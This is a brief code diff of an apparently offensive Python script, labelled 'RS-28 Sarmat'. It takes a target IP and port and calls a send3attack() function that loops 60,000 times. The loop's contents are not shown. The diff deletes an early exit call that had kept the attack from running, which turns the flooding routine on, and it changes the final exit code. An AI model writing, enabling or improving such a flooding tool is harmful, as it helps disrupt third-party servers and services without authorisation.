@@ -75,7 +75,7 @@ port = int(input("Port: "))
 url = f"http://{str(ip)}"
 print("[>>>] RS-28 Sarmat [<<<]")
 sleep(1)
-exit("1")
+
 	
 def send3attack():
   for i in range(60000): #Poder mágico
@@ -85,4 +85,4 @@ def send3attack():
 
     
 send3attack()
-exit(0)
+exit(1)
